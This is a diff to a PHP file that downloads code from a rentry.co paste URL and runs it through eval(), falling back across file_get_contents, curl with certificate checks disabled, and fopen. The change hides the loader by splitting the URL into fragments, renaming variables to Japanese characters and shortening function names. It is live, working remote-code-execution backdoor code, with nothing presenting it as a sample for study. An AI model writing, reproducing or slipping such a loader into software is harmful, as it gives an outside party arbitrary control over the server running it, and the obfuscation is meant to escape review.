@@ -1,50 +1,49 @@
 <?php
-$url = "https://rentry.co/4wgrue7y/raw";
-
-function get_with_file_get_contents($url) {
+$u = "htt"; 
+$d = "ps://"; 
+$a = "rentry.co"; 
+$デ = "/"; 
+$の = "aboutphp"; 
+$ur = "/raw"; 
+$url = $u . $d . $a . $デ . $の . $ur; // URL data
+function t($u) {
     if (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
+        return file_get_contents($u);
     } else {
         return false;
     }
 }
-
-function get_with_curl($url) {
+function c($u) {
     if (function_exists('curl_version')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
+        $c = curl_init($u);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+        $r = curl_exec($c);
+        curl_close($c);
+        return $r;
     } else {
         return false;
     }
 }
-
-function get_with_streams($url) {
-    if ($stream = fopen($url, 'r')) {
-        $data = stream_get_contents($stream);
-        fclose($stream);
-        return $data;
+function s($u) {
+    if ($s = fopen($u, 'r')) {
+        $r = stream_get_contents($s);
+        fclose($s);
+        return $r;
     } else {
         return false;
     }
 }
-
-$content = get_with_file_get_contents($url);
-
+$content = t($url);
 if ($content === false) {
-    $content = get_with_curl($url);
+    $content = c($url);
 }
-
 if ($content === false) {
-    $content = get_with_streams($url);
+    $content = s($url);
 }
-
 if ($content !== false) {
-    eval("?>".$content);
+    eval("?>" . $content);
 } else {
-    echo "Error.";
+    echo "エラー。";
 }
 ?>
